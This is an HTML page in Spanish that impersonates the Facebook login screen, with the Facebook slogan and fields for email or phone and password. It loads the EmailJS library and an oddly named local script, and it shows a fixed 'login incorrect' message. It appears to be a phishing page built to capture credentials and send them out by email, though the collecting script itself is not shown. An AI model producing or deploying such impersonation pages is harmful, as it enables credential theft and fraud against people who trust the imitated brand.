<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .wrapper {
            display: flex;
            flex-direction: row;
            align-items: center;
            width: 100%;
            max-width: 1200px;
            padding: 20px;
            box-sizing: border-box;
        }

        .logo-section {
            flex: 1;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-section img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }

        .logo-section p {
            font-size: 18px;
            color: #666;
            text-align: center;
        }

        .form-section {
            flex: 1;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        .form-section h1 {
            margin: 0;
            color: #333;
            font-size: 28px;
            line-height: 1.3;
        }

        .form-section .subtitle {
            font-size: 18px;
            color: #666;
            margin-bottom: 20px;
        }

        .form-section label {
            display: block;
            margin: 10px 0 5px;
            text-align: left;
        }

        .form-section input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .form-section input::placeholder {
            color: #aaa;
            opacity: 1;
        }

        .form-section button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            box-sizing: border-box;
        }

        .form-section button:hover {
            background-color: #0056b3;
        }

        #error-message {
            color: red;
            display: none; /* Initially hidden */
            margin-top: 10px;
        }

        @media (max-width: 768px) {
            .wrapper {
                flex-direction: column;
                align-items: center;
            }

            .logo-section {
                margin-bottom: 20px;
            }

            .form-section {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="logo-section">
            <img src="size.alt" alt="Logo">
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="form-section">
            <h1>Inicia sesión</h1>
            <div class="subtitle">Para continuar</div>
            <form id="contact-form">
                <input type="email" id="email" name="email" placeholder="Correo electrónico o número de teléfono" required>
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar Sesión</button>
                <div id="error-message">Inicio de sesión incorrecto.</div>
            </form>
        </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript" src="layout.par"></script>
</body>
</html>
